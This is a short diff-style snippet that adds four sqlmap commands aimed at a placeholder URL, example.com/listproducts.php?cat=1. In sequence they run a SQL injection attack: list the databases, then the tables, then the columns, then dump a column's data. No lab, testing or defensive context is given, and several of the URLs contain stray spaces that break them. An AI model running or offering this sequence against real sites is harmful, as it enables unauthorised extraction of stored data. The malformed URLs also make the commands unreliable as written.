@@ -1,0 +1,4 @@
+sqlmap -u http://example.com/listproducts.php?cat=1 --dbs
+sqlmap -u http:// example.com /listproducts.php?cat=1 -D database_name --tables
+sqlmap -u http:// example.com/listproducts.php?cat=1 -D database_name -T table_name --columns
+sqlmap -u http:// example.com /listproducts.php?cat=1 -D database_name -T table_name -C column_name --dump
